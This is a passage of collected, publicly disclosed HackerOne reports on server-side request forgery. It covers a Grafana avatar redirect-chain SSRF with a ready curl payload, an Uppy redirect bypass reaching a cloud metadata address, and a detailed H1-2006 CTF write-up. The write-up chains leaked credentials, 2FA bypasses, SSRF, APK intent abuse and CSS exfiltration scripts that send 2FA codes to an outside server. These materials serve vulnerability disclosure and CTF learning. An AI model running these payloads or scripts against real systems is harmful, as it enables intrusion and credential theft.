## Details
In the grafana source code, the following route is defined:
```
	r.Get("/avatar/:hash", avatarCacheServer.Handler)
```
This route takes the hash from under `/avatar/:hash` and routes it to `secure.grafana.com` in order to access a user's gravatar image. The code that does this looks like this:
```
const (
	gravatarSource = "https://secure.gravatar.com/avatar/"
)
...
case err = <-thunder.GoFetch(gravatarSource+this.hash+"?"+this.reqParams, this):
```
The `this.hash` referenced in this code is the hash passed in via `/avatar/:hash` **URL Decoded**. The fact that this `:hash` is URL Decoded allows us to smuggle in our own parameters into this request. On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted. This is the first redirect in the redirect chain.

In order to get from `i0.wp.com` to any arbitrary host, quite a lot of investigation into this domain had to be performed. In the end, the open redirect achieved due to some improper redirect validation. The format of urls on `i0.wp.com` are as follows `i0.wp.com/{domainOfImage}/{pathOfImage}`. It seems that `i0.wp.com` wanted to offload some of its image hosting to `.bp.blogspot.com` whenever possible, so for any host whose domain was `*.bp.blogspot.com`, `i0.wp.com` would redirect to that host in order to avoid serving the image. However, after many long hours of investigation, it was discovered that it is possible to turn this into an open redirect using the following form:
```
http://i0.wp.com/google.com/1.bp.blogspot.com/
```
By using this trick it is possible to create a redirection chain that goes like this:
```
https://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/
->
http://i0.wp.com/google.com/1.bp.blogspot.com/
->
https://google.com/1.bp.blogspot.com
```

Finally, using this it is possible to create the SSRF using the following payload:
```
https://dev.gitlab.org/-/grafana/avatar/tesata%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fYOURHOSTHERE%26cachebust
```
(`redirect.rhynorater.com` is configured to redirect to any host provided after the `1.bp.blogspot.com` directory)

## Steps to Reproduce
Run the following `curl` command:
```
curl "https://dev.gitlab.org/-/grafana/avatar/test%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fpoc.rhynorater.com%26cachebust"
```

## Remediation
In order to remediate this bug one must either take the Grafana instance inside the internal network or WAF off the `/avatar/` endpoint.

## Impact

Full read, unauthenticated SSRF. This can result in RCE in many environments due to cloud misconfigurations

---

### [SSRF via Export Service in  ActiveCampaign](https://hackerone.com/reports/847101)

- **Report ID:** `847101`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Stripo Inc
- **Reporter:** @dotsecurity
- **Bounty:** - usd
- **Disclosed:** 2020-07-13T11:55:44.254Z
- **CVE(s):** -

**Summary (team):**

SSRF with ActiveCampaign

---

### [SSRF in my.stripo.email](https://hackerone.com/reports/852413)

- **Report ID:** `852413`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Stripo Inc
- **Reporter:** @x25s
- **Bounty:** - usd
- **Disclosed:** 2020-06-30T12:59:25.348Z
- **CVE(s):** -

**Summary (team):**

They are a SSRF (Server-side Request Forgery) in https://my.stripo.email
An attacker can do an attack and get ip address behind WAF and try to get RCE

---

### [[Uppy] Internal Server side request forgery (bypass of #786956)](https://hackerone.com/reports/891270)

- **Report ID:** `891270`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Node.js third-party modules
- **Reporter:** @mahmoud0x00
- **Bounty:** - usd
- **Disclosed:** 2020-06-28T13:50:00.398Z
- **CVE(s):** CVE-2020-8205

**Vulnerability Information:**

I would like to report `Internal Server-side request forgery` in Uppy
It allows the attacker to easily extract information from internal servers

# Module

**module name:** Uppy
**version:**1.15.0
**npm page:** `https://www.npmjs.com/package/uppy`

## Module Description

Uppy is a sleek, modular JavaScript file uploader that integrates seamlessly with any application. It’s fast, easy to use and lets you worry about more important problems than building a file uploader.

## Module Stats

[1] weekly downloads: 37,599

# Vulnerability
Server-Side Request Forgery (SSRF)
## Vulnerability Description

When I checked your fix on #786956, I noticed that you fixed this issue by doing a check on the host 's IP address against a blacklist before passing it to the server to fetch (You can check that [here](https://github.com/transloadit/uppy/blob/7525440229bde28241e34ba3eacf3fad77269c05/packages/%40uppy/companion/src/server/helpers/request.js), But you forgot to stop redirection to these IP addresses, therefore attacker can create a host or file and redirect all requests which are being received to a specific internal host, this will bypass your check, in the first phase, System will check if this host is allowed or no, if it is allowed, Server will pass the request. But it won't be able to verify which host is being redirected to. 

## Steps To Reproduce: 

+ feel free to set up a custom Uppy version on your server and try these steps on

1. Go to https://uppy.io/
2. Choose download file via a link 
3. Pass this link to the system `https://tinyurl.com/gqdv39p` (it redirects to `http://169.254.169.254/metadata/v1/`)
4. Upload fetched file
5. Download that file
6. Open that file and you should see a copy of DigitalOcean 's metadata host response
██████



## Supporting Material/References:
███ 

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Unauthorized access to sensitive info on internal hosts/services.

---

### [[H1-2006 2020] CTF Writeup](https://hackerone.com/reports/893305)

- **Report ID:** `893305`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @huerfano
- **Bounty:** - usd
- **Disclosed:** 2020-06-22T22:58:02.255Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
 
### Multiple Vulnerabilities leading to full account takeover and access to restricted functions

1. Information Disclosure
2. Login 2FA Bypass
3. SSRF
4. Hardcoded validation
5. Sensitive information disclosure
6. Privilege Escalation
7. Payments 2FA Bypass through SSRF


## Steps To Reproduce:
  
0. Recon
---------------------
I got some information about the subdomains with certspotter

```bash
certspotter bountypay.h1ctf.com

api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
```
  
1. Information Disclosure
---------------------

Doing some directory brute force to https://app.bountypay.h1ctf.com found a /.git/ directory with config file.

{F858119}

This config file is linked to a github repo https://github.com/bounty-pay-code/request-logger.git

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

In this repo exist only one file called logger.php who explains how the website logs request and looks like this
```
<?php
$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);
file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```
in simple words, every line contains the timestamp and a base 64 encoded json string with request information. Then looked for bp_web_trace.log in https://app.bountypay.h1ctf.com/bp_web_trace.log and decoded the base64 string:

```bash
Original:
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

Decoded:
1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

```
Bingo! got first credentials

__username__: brian.oliver
__password__: V7h0inzX
  
2. Login 2FA Bypass
---------------------
Logging in with this credentials there was a 2FA 

{F858126}

This form contains a hidden field called challenge with md5 hash and the challenge_answer with user input.

```html
<form method="post" action="/">
    <input type="hidden" name="username" value="brian.oliver">
    <input type="hidden" name="password" value="V7h0inzX">
    <input type="hidden" name="challenge" value="832985fb487bcae88db2fc144fc15378">
    <div class="panel panel-default" style="margin-top:50px">
        <div class="panel-heading">Login</div>
        <div class="panel-body">
            <div style="margin-top:7px"><label>For Security we've sent a 10 character password to your mobile phone, please enter it below</label></div>
            <div style="margin-top:7px"><label>Password contains characters between A-Z , a-z and 0-9</label></div>
            <div><input name="challenge_answer" class="form-control"></div>
        </div>
    </div>
    <input type="submit" class="btn btn-success pull-right" value="Login">
</form>
```
After some tests i realized the challenge field is just md5(challenge_answer) and does not validate the number of characters of the answer. 
So if you send:

challenge = 0cc175b9c0f1b6a831c399e269772661 -> md5(a)   or any string
challenge_answer = a

You can bypass 2FA. 

3. Server Side Request Forgery
---------------------
In the user session the pay button makes a get request to statements?month=MONTH_NUMBER&year=YEAR and get a json response. Making a request with month=05 and year=2020 i got:

```json
{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05&year=2020",
  "data": "{\"description\":\"Transactions for 2020-05\",\"transactions\":[]}"
}
```

Additionally, the cookie is a base64-encoded json string

```bash
eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9

decoded:
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
So, the account_id is in the response and should be usefull to get SSRF.

Going to https://api.bountypay.h1ctf.com/ found 

```html
<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="text-center" style="margin-top:30px"><img src="/images/bountypay.png" height="150"></div>
            <h1 class="text-center">BountyPay API</h1>
            <p style="text-align: justify">Our BountyPay API controls all of our services in one place. We use a <a href="/redirect?url=https://www.google.com/search?q=REST+API">REST API</a> with JSON output. If you are interested in using this API please contact your account manager.</p>
        </div>
    </div>
</div>
```

This url https://api.bountypay.h1ctf.com/redirect?url= has a whitelist and cannot "redirect" to any site so i had to move on a little.
On the other side, the url https://software.bountypay.h1ctf.com/ shows an 401 Unauthorized message.

{F858176}

The message "You do not have permission to access this server from your IP Address" is the hint to test this url in redirect.

Testing redirect with software url https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/ from cookie like this:
```bash
decoded:
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}

base64-encoded:
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=
```
Response 
```html
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 15:10:37 GMT
Content-Type: application/json
Connection: close
Content-Length: 1605

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=04&year=2020","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
```
Got SSRF!

At this time, just need to find some sensitive directory or file in software subdomain, so i generate a cookie payload list with python using the dirsearch dictionary, import it in burp intruder and process payload with base64 encoding.

```
#!/usr/bin/python3
file = open("payloads.txt","a") 
with open('dicc.txt') as fp:
   line = fp.readline()
   while line:
       url = 'https://software.bountypay.h1ctf.com/{}/#'.format(line.strip())
       l = '{"account_id":"../../redirect?url=%s","hash":"de235bffd23df6995ad4e0930baac1a2"}' % url
       file.write(l+'\n') 
       line = fp.readline()
file.close()
```
Send the request to intruder and import payload list.
{F858200}
{F858201}

Then found an apk in https://software.bountypay.h1ctf.com/uploads/BountyPay.apk  
Time to analize apk file!

4. Hardcoded validation
---------------------

Extracting apk file and reading AndroidManifest.xml got some interesting information

```xml
<activity android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="three"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="two"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="one"/>
            </intent-filter>
        </activity>
```

Using dex2jar to get jar file from apk and openning jar file with JDGui
```
dex2jar BountyPay.apk
```

{F858209}

PartOneActivity
```java
 if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        str = sharedPreferences.getString("USERNAME", "");
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
        editor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, str1);
        startActivity(new Intent(this, PartTwoActivity.class));
      } 
    } 
```
Part one require an intent with start parameter equals to "PartTwoActivity". An reading the intents in manifest

```xml
<data android:host="part" android:scheme="one"/>
<data android:host="part" android:scheme="two"/>
<data android:host="part" android:scheme="three"/>
```

Sending intent with adb.

```bash
adb shell am start -a "android.intent.action.VIEW" -d "one://part?start=PartTwoActivity"
```
Same method in PartTwoActivity

```java
if (getIntent() != null && getIntent().getData() != null) {
      Uri uri = getIntent().getData();
      String str1 = uri.getQueryParameter("two");
      String str2 = uri.getQueryParameter("switch");
      if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textView.setVisibility(0);
      } 
    } 
```
```bash
adb shell am start -a "android.intent.action.VIEW" -d "two://part?two=light\&switch=on"
```
Now some md5 hash is on the screen, copy it and try to crack it.

459a6f79ad9b13cbcb5f692d2cc7a94d = Token

Finally PartThreeActivity
```java
if (getIntent() != null && getIntent().getData() != null) {
      Uri uri = getIntent().getData();
      final String firstParam = uri.getQueryParameter("three");
      final String secondParam = uri.getQueryParameter("switch");
      final String thirdParam = uri.getQueryParameter("header");
      byte[] arrayOfByte2 = Base64.decode(str1, 0);
      byte[] arrayOfByte1 = Base64.decode(str2, 0);
      final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);
      final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);
      this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onCancelled(DatabaseError param1DatabaseError) { Log.e("TAG", "onCancelled", param1DatabaseError.toException()); }
            public void onDataChange(DataSnapshot param1DataSnapshot) {
              String str = (String)param1DataSnapshot.getValue();
              if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
                String str1 = thirdParam;
                if (str1 != null) {
                  StringBuilder stringBuilder = new StringBuilder();
                  stringBuilder.append("X-");
                  stringBuilder.append(str);
                  if (str1.equals(stringBuilder.toString())) {
                    editText.setVisibility(0);
                    button.setVisibility(0);
                    PartThreeActivity.this.thread.start();
                  } 
                } 
              } 
            }
          });
    } 
```

three=base64('PartThreeActivity')
switch=base64('on')

```bash
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
```
In other window i started logcat to capture app output.

```bash
adb -d logcat bounty.pay:I
```
{F858224}

```bash
HOST IS: : http://api.bountypay.h1ctf.com
TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1
```
Insert leaked hash and submit.

{F858220}
Bingo! all android challenges completed.

5. Sensitive information disclosure
---------------------
At this time i can consume api with X-Token.

Brute forcing api directories to get endpoints to consume.

```bash
400 -   22B  - /api/accounts/login
400 -   22B  - /api/accounts/signin
400 -   22B  - /api/accounts/logon
200 -  104B  - /api/staff
200 -  104B  - /api/staff/
```
Then open https://api.bountypay.h1ctf.com/api/staff and send to burp repeater to add X-Token header

Request
```bash
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```
Response
``` bash
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 17:13:50 GMT
Content-Type: application/json
Connection: close
Content-Length: 104

[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

Changing the request to POST and sent staff_id with retrieved data
request:
```bash
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:KE624RQ2T9
```
Response
```bash
HTTP/1.1 409 Conflict
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 17:16:32 GMT
Content-Type: application/json
Connection: close
Content-Length: 39

["Staff Member already has an account"]
```
So i needed to find a new staff member to activate.
Got twitter information from https://twitter.com/BountypayHQ  and found a welcome tweet https://twitter.com/BountypayHQ/status/1258692286256500741
There is the new member and need to activate her account.

Looking for who is following bountypayhq account
https://twitter.com/bountypayhq/following

And finally found Sandra's twitter account 
https://twitter.com/SandraA76708114

{F858267}

So finally got the staff id to activate the account.

```
staff_id=STF:8FJ3KFISL3
```
```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 17:38:13 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```
Bingo! got another credentials

__username__: sandra.allison
__password__: s%3D8qB8zEpMnc*xsz7Yp5

Time to log in https://staff.bountypay.h1ctf.com/

6. Privilege Escalation
---------------------
After logging in staff site, found some interesting function.

Avatar change: sets avatar value in div class

website.js: 
```javascript
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```
So, there is a way to escalate privileges reporting a url who triggers upgradeToAdmin function with sandra.allison username.
Changing avatar to "tab4 upgradeToAdmin" i can control the execution of upgradeToAdmin function through url with #tab4, but the username was undefined.
```
https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab4 
```
to avoid undefined username, tried to get login template and ticket template together. Then had everything working together and reported base64 encoded path.

```
decoded
/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4

encoded
Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQK
```
Got admin privileges and another credentials.

__username__: marten.mickos
__password__: h&H5wy2Lggj*kKn4OD&Ype

Finally, Marten Mickos account! 
Time to go back to https://app.bountypay.h1ctf.com/

7. Payments 2FA Bypass through SSRF
---------------------
Logged in with marten.mickos credentials and bypassing 2FA mentioned before (1), retrieved payments for 05/2020
{F858290}

Pressing pay button got new 2FA page.
{F858292}

Analyzing send challenge request
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```
The request sends a css url, so tried the same request with my server url got request from remote server...and SSRF again!.

```
3.21.98.146 - - [07/Jun/2020 18:11:47] code 404, message File not found
3.21.98.146 - - [07/Jun/2020 18:11:47] "GET /test HTTP/1.1" 404 -
```
Reading something about css data exfiltration, i found something who helped me and created python script.

```python
#/bin/python3

import string

css = 'css/uni_2fa_style.css'
hostname = 'https://leoastorga.com:3000'

def name(x):
    file = open(css,'w')
    for s in (string.ascii_letters + string.digits + '-_'):
        line = "input[name^='%s'] {background: url('%s/%s');}" % (x+s, hostname, x+s)
        print(line)
        file.write(line+'\n')
    file.close()

if __name__ == "__main__":
    input = input("str: ")
    while(input != 'exit'):
        name(input)
        input = input("str: ")
```

Sent my css url and executing python script to update it, retrieved information about field names. There is a input field for each character!!
```
app_style=https://leoastorga.com:3000/css/uni_2fa_style.css
```
```
3.21.98.146 - - [07/Jun/2020 18:23:56] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:23:56] "GET /c HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:00] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:24:01] "GET /co HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:08] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:24:08] "GET /cod HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:14] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:24:15] "GET /code HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:21] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:24:21] "GET /code_ HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:29] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_7 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_1 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_2 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_3 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_4 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_5 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:24:30] "GET /code_6 HTTP/1.1" 404 -
```

adding some function to my python script to retrieve the information for each field.

```python
#/bin/python3
import string

css = 'css/uni_2fa_style.css'
hostname = 'https://leoastorga.com:3000'

def name(x):
    file = open(css,'w')
    for s in (string.ascii_letters + string.digits + '-_'):
        line = "input[name^='%s'] {background: url('%s/%s');}" % (x+s, hostname, x+s)
        print(line)
        file.write(line+'\n')
    file.close()

def value():
    file = open(css,'w')
    for s in (string.ascii_letters + string.digits):
        for i in range(1,8):
            line = "input[name='code_%d'][value^='%s'] {background: url('%s/%d_%s');}" % (i, s, hostname, i, s)
            print(line)
            file.write(line+'\n')
    file.close()

if __name__ == "__main__":
    value()
    #input = input("str: ")
    #while(input != 'exit'):
    #    name(input)
    #    input = input("str: ")
```
Then executed every thing together and got the following response
```
3.21.98.146 - - [07/Jun/2020 18:17:59] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /7_i HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /1_0 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /2_8 HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /3_P HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /4_V HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /5_F HTTP/1.1" 404 -
3.21.98.146 - - [07/Jun/2020 18:18:00] "GET /6_J HTTP/1.1" 404 -
```
Sort by field number got "O8PVFJi", sent the 2FA code and paid the bountys!

{F858313}

Flag: ==^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$==

## Supporting Material/References:
https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/

## Impact

By chaining multiple vulnerabilities attacker can achieve full account takeover and access to restricted functions.

---

### [[H1-2006 2020]   CTF Writeup](https://hackerone.com/reports/887766)

- **Report ID:** `887766`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @shoeb_
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:29:40.095Z
- **CVE(s):** -

**Vulnerability Information:**

Just submitting Flag for now, Will soon submit Writeup :)

## Impact

Flag: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

---

### [[H1-2006 2020] CTF write-up](https://hackerone.com/reports/890555)

- **Report ID:** `890555`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @counterbreach
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:27:58.044Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

thank you for the awesome CTF! I definetly learned a lot. For now I will submit just the Flag. I am going to follow up with the Writeup as soon as possible.

